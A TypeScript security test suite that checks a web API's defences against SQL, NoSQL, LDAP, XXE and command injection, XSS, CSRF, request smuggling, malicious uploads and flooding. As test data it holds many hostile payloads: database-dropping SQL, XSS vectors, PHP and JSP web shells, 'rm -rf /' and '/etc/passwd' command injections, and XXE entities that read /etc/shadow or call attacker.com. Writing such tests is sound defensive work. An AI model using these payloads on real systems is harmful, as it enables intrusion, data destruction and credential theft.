import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import request from 'supertest';
import { User } from '@prisma/client';
import crypto from 'crypto';

import { app } from '../../../src/server';
import { cleanDatabase, disconnectDatabase } from '../../helpers/database';
import { createTestUser, generateValidToken } from '../../helpers/auth';

describe('Advanced Attack Prevention Security Tests', () => {
  let testUser: User;
  let adminUser: User;
  let userToken: string;
  let adminToken: string;

  beforeAll(async () => {
    // Setup test environment
  });

  beforeEach(async () => {
    await cleanDatabase();
    
    testUser = await createTestUser({
      email: 'user@example.com',
      name: 'Test User',
      plexId: 'plex-user',
      role: 'user',
    });

    adminUser = await createTestUser({
      email: 'admin@example.com',
      name: 'Admin User',
      plexId: 'plex-admin',
      role: 'admin',
    });
    
    userToken = await generateValidToken(testUser.id);
    adminToken = await generateValidToken(adminUser.id);
  });

  afterAll(async () => {
    await disconnectDatabase();
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in search parameters', async () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT password FROM users --",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' OR 1=1 LIMIT 1 OFFSET 0 --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "\"; DROP TABLE users; --",
        "1'; WAITFOR DELAY '00:00:30'; --",
        "' OR SLEEP(30) --",
        "'; EXEC xp_cmdshell('dir'); --",
      ];

      for (const payload of sqlPayloads) {
        const response = await request(app)
          .get('/api/users/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${userToken}`);

        // Should not cause internal server error or expose data
        expect([200, 400, 404]).toContain(response.status);
        
        if (response.status === 200) {
          // Verify no sensitive data is exposed
          expect(response.body).not.toHaveProperty('password');
          expect(response.body).not.toHaveProperty('passwordHash');
          expect(JSON.stringify(response.body)).not.toContain('hacker@evil.com');
        }
      }
    });

    it('should prevent SQL injection in POST body parameters', async () => {
      const maliciousData = {
        name: "'; DROP TABLE users; --",
        email: "test@example.com'; INSERT INTO admins VALUES('hacker'); --",
        description: "' UNION SELECT * FROM sensitive_data --",
      };

      const response = await request(app)
        .post('/api/user-profile')
        .set('Authorization', `Bearer ${userToken}`)
        .send(maliciousData);

      expect([200, 400, 422]).toContain(response.status);
      
      // Verify database integrity by checking user still exists
      const userCheck = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${userToken}`);

      expect(userCheck.status).toBe(200);
    });

    it('should prevent blind SQL injection timing attacks', async () => {
      const timingPayloads = [
        "' OR (SELECT SLEEP(5)) --",
        "'; WAITFOR DELAY '00:00:05'; --",
        "' AND (SELECT pg_sleep(5)) --",
        "' OR BENCHMARK(5000000,MD5('test')) --",
      ];

      for (const payload of timingPayloads) {
        const startTime = Date.now();
        
        const response = await request(app)
          .get('/api/users/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${userToken}`);

        const duration = Date.now() - startTime;

        // Response should not be delayed by malicious queries
        expect(duration).toBeLessThan(2000); // Less than 2 seconds
        expect([200, 400, 404]).toContain(response.status);
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent MongoDB injection attacks', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
        { $or: [{ admin: true }] },
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: payload,
            password: payload,
          });

        expect([400, 401]).toContain(response.status);
        expect(response.body).not.toHaveProperty('token');
      }
    });

    it('should sanitize JSON input for NoSQL queries', async () => {
      const maliciousJson = {
        filter: {
          $where: 'return true',
          $regex: '.*',
        },
        options: {
          $limit: 999999,
        },
      };

      const response = await request(app)
        .post('/api/data/query')
        .set('Authorization', `Bearer ${userToken}`)
        .send(maliciousJson);

      expect([400, 403]).toContain(response.status);
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should prevent reflected XSS in URL parameters', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .get('/api/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 200) {
          // Verify response is properly escaped
          expect(response.body).not.toContain('<script>');
          expect(response.body).not.toContain('javascript:');
          expect(response.body).not.toContain('onerror=');
          expect(response.body).not.toContain('onload=');
        }
      }
    });

    it('should prevent stored XSS in user-generated content', async () => {
      const xssContent = '<script>document.cookie="hijacked=true"</script>';

      // Attempt to store XSS payload
      const postResponse = await request(app)
        .post('/api/user-comments')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          content: xssContent,
          postId: 'test-post-123',
        });

      if (postResponse.status === 201) {
        // Retrieve the content
        const getResponse = await request(app)
          .get('/api/user-comments/test-post-123')
          .set('Authorization', `Bearer ${userToken}`);

        if (getResponse.status === 200) {
          // Content should be sanitized
          expect(JSON.stringify(getResponse.body)).not.toContain('<script>');
          expect(JSON.stringify(getResponse.body)).not.toContain('document.cookie');
        }
      }
    });

    it('should set proper Content-Security-Policy headers', async () => {
      const response = await request(app)
        .get('/api/dashboard')
        .set('Authorization', `Bearer ${userToken}`);

      const csp = response.headers['content-security-policy'];
      expect(csp).toBeDefined();
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).not.toContain("'unsafe-inline'");
      expect(csp).not.toContain("'unsafe-eval'");
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Prevention', () => {
    it('should require CSRF tokens for state-changing operations', async () => {
      // Attempt operation without CSRF token
      const response = await request(app)
        .post('/api/user-settings')
        .set('Authorization', `Bearer ${userToken}`)
        .set('Origin', 'https://evil.com')
        .send({
          theme: 'dark',
        });

      expect([403, 412]).toContain(response.status);
      if (response.status === 403) {
        expect(response.body.code).toBe('CSRF_TOKEN_MISSING');
      }
    });

    it('should validate CSRF tokens correctly', async () => {
      // Get CSRF token
      const tokenResponse = await request(app)
        .get('/api/csrf-token')
        .set('Authorization', `Bearer ${userToken}`);

      if (tokenResponse.status === 200) {
        const csrfToken = tokenResponse.body.data.token;

        // Valid CSRF token should work
        const validResponse = await request(app)
          .post('/api/user-settings')
          .set('Authorization', `Bearer ${userToken}`)
          .set('X-CSRF-Token', csrfToken)
          .send({ theme: 'dark' });

        expect([200, 201]).toContain(validResponse.status);

        // Invalid CSRF token should be rejected
        const invalidResponse = await request(app)
          .post('/api/user-settings')
          .set('Authorization', `Bearer ${userToken}`)
          .set('X-CSRF-Token', 'invalid-token')
          .send({ theme: 'light' });

        expect(invalidResponse.status).toBe(403);
        expect(invalidResponse.body.code).toBe('INVALID_CSRF_TOKEN');
      }
    });

    it('should implement double-submit cookie pattern', async () => {
      const response = await request(app)
        .post('/api/user-settings')
        .set('Authorization', `Bearer ${userToken}`)
        .set('Cookie', 'csrf-token=abc123')
        .set('X-CSRF-Token', 'xyz789')
        .send({ theme: 'auto' });

      expect(response.status).toBe(403);
      expect(response.body.code).toBe('CSRF_TOKEN_MISMATCH');
    });
  });

  describe('Request Tampering and Manipulation', () => {
    it('should prevent HTTP parameter pollution', async () => {
      const response = await request(app)
        .get('/api/users/search?role=user&role=admin')
        .set('Authorization', `Bearer ${userToken}`);

      // Should handle duplicate parameters safely
      expect([200, 400]).toContain(response.status);
      
      if (response.status === 200) {
        // Should not return admin users for regular user
        const adminUsers = response.body.data?.filter((user: any) => user.role === 'admin') || [];
        expect(adminUsers.length).toBe(0);
      }
    });

    it('should prevent HTTP request smuggling', async () => {
      const maliciousHeaders = {
        'Content-Length': '100',
        'Transfer-Encoding': 'chunked',
      };

      const response = await request(app)
        .post('/api/test')
        .set('Authorization', `Bearer ${userToken}`)
        .set(maliciousHeaders)
        .send('malicious request');

      // Server should handle conflicting headers safely
      expect([400, 413, 422]).toContain(response.status);
    });

    it('should validate Content-Type headers', async () => {
      const maliciousContentTypes = [
        'application/json; charset=utf-7',
        'text/html',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'application/xml',
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request(app)
          .post('/api/user-settings')
          .set('Authorization', `Bearer ${userToken}`)
          .set('Content-Type', contentType)
          .send(JSON.stringify({ theme: 'dark' }));

        // Should only accept expected content types
        if (contentType !== 'application/json') {
          expect([400, 415]).toContain(response.status);
        }
      }
    });
  });

  describe('File Upload Security', () => {
    it('should prevent malicious file uploads', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', content: 'MZ\x90\x00\x03\x00\x00\x00' }, // PE header
        { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'shell.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'virus.bat', content: '@echo off\nformat c: /y' },
        { name: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' },
        { name: 'image.jpg.php', content: 'GIF89a<?php echo "hacked"; ?>' },
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/avatar/upload')
          .set('Authorization', `Bearer ${userToken}`)
          .attach('file', Buffer.from(file.content), file.name);

        expect([400, 415, 422]).toContain(response.status);
        if (response.body.code) {
          expect(['INVALID_FILE_TYPE', 'MALICIOUS_FILE_DETECTED']).toContain(response.body.code);
        }
      }
    });

    it('should validate file types and content', async () => {
      // Valid image with PHP code in metadata
      const fakeImage = Buffer.concat([
        Buffer.from('GIF89a'),
        Buffer.from('<?php system($_GET["cmd"]); ?>'),
        Buffer.from('\x00'.repeat(100)), // Padding
      ]);

      const response = await request(app)
        .post('/api/avatar/upload')
        .set('Authorization', `Bearer ${userToken}`)
        .attach('file', fakeImage, 'image.gif');

      expect([400, 415]).toContain(response.status);
    });

    it('should prevent zip bomb attacks', async () => {
      // Create a zip bomb (highly compressed file)
      const zipBomb = Buffer.alloc(1024 * 1024, 'A'); // 1MB of 'A's

      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${userToken}`)
        .attach('file', zipBomb, 'bomb.zip');

      // Should detect and reject oversized compressed files
      expect([400, 413]).toContain(response.status);
    });
  });

  describe('API Rate Limiting and DoS Prevention', () => {
    it('should implement adaptive rate limiting', async () => {
      // Start with normal requests
      let responses = await Promise.all(
        Array(10).fill(null).map(() =>
          request(app)
            .get('/api/users/me')
            .set('Authorization', `Bearer ${userToken}`)
        )
      );

      expect(responses.every(r => r.status === 200)).toBe(true);

      // Sudden spike should trigger adaptive limiting
      responses = await Promise.all(
        Array(100).fill(null).map(() =>
          request(app)
            .get('/api/users/me')
            .set('Authorization', `Bearer ${userToken}`)
        )
      );

      const rateLimited = responses.filter(r => r.status === 429).length;
      expect(rateLimited).toBeGreaterThan(50);
    });

    it('should prevent slowloris attacks', async () => {
      // Simulate slow request
      const slowResponse = await request(app)
        .post('/api/slow-endpoint')
        .set('Authorization', `Bearer ${userToken}`)
        .timeout(30000) // 30 second timeout
        .send(JSON.stringify({ data: 'x'.repeat(1000000) }));

      // Server should timeout or reject oversized requests
      expect([400, 413, 408]).toContain(slowResponse.status);
    });

    it('should implement request size limits', async () => {
      const oversizedPayload = {
        data: 'x'.repeat(10 * 1024 * 1024), // 10MB payload
      };

      const response = await request(app)
        .post('/api/user-data')
        .set('Authorization', `Bearer ${userToken}`)
        .send(oversizedPayload);

      expect(response.status).toBe(413);
    });
  });

  describe('Advanced Injection Attacks', () => {
    it('should prevent LDAP injection', async () => {
      const ldapPayloads = [
        '*)(uid=*',
        '*)(|(uid=*))',
        '*)|(|(password=*))',
        '*)|(|(cn=*)',
      ];

      for (const payload of ldapPayloads) {
        const response = await request(app)
          .get('/api/ldap/search')
          .query({ username: payload })
          .set('Authorization', `Bearer ${adminToken}`);

        expect([200, 400, 404]).toContain(response.status);
        
        if (response.status === 200) {
          expect(response.body.data).toBeInstanceOf(Array);
          // Should not return excessive results
          expect(response.body.data.length).toBeLessThan(100);
        }
      }
    });

    it('should prevent XML External Entity (XXE) attacks', async () => {
      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
      ];

      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/xml/parse')
          .set('Authorization', `Bearer ${userToken}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        expect([400, 422]).toContain(response.status);
        
        if (response.body.data) {
          expect(response.body.data).not.toContain('/etc/passwd');
          expect(response.body.data).not.toContain('root:');
        }
      }
    });

    it('should prevent command injection', async () => {
      const commandPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '\n/bin/sh\n',
      ];

      for (const payload of commandPayloads) {
        const response = await request(app)
          .post('/api/system/command')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ command: payload });

        expect([400, 403]).toContain(response.status);
        
        if (response.body.output) {
          expect(response.body.output).not.toContain('root');
          expect(response.body.output).not.toContain('/bin/sh');
        }
      }
    });
  });

  describe('Protocol and Transport Security', () => {
    it('should enforce HTTPS redirects', async () => {
      // This would test HTTPS enforcement in production
      const response = await request(app).get('/api/health');
      
      // In test environment, just verify security headers are set
      expect(response.headers).toHaveProperty('strict-transport-security');
    });

    it('should prevent HTTP header injection', async () => {
      const maliciousHeaders = {
        'X-Custom-Header': 'value\r\nSet-Cookie: malicious=true',
        'User-Agent': 'Mozilla\r\nX-Injected: header',
      };

      const response = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${userToken}`)
        .set(maliciousHeaders);

      expect([200, 400]).toContain(response.status);
      
      // Response should not contain injected headers
      expect(response.headers).not.toHaveProperty('x-injected');
      expect(response.headers['set-cookie']).not.toContain('malicious=true');
    });

    it('should validate Host header', async () => {
      const maliciousHosts = [
        'evil.com',
        'localhost:3000.evil.com',
        '127.0.0.1:8080',
        'attacker.example.com',
      ];

      for (const host of maliciousHosts) {
        const response = await request(app)
          .get('/api/users/me')
          .set('Authorization', `Bearer ${userToken}`)
          .set('Host', host);

        // Should validate Host header against allowed hosts
        expect([200, 400]).toContain(response.status);
      }
    });
  });
});